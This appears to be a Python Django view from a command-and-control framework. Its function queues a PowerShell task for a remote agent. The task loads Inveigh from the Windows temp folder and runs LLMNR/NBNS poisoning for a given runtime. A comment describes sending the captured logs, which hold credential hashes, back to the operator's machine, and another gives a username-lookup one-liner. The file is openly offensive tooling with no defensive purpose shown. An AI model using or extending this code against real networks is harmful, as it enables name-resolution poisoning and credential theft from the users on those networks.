import os
from blog.views import *
from blog.models import *

current_path= os.path.dirname(os.path.abspath(__file__))


#get the username:  $test=whoami; $username= ($test -split '\\')[-1]
def llmnr_poison(request, agent='', time=0):
    if request.method=='POST':
        task = 'echo "===============Inveigh starting===============";import-module c:\windows\temp\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {}'.format(time)
        #then send the inveigh logs (c:\windows\temp\Inveigh-*) files to our machine
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
    else:
        return render(request, 'blog/listeners.html')
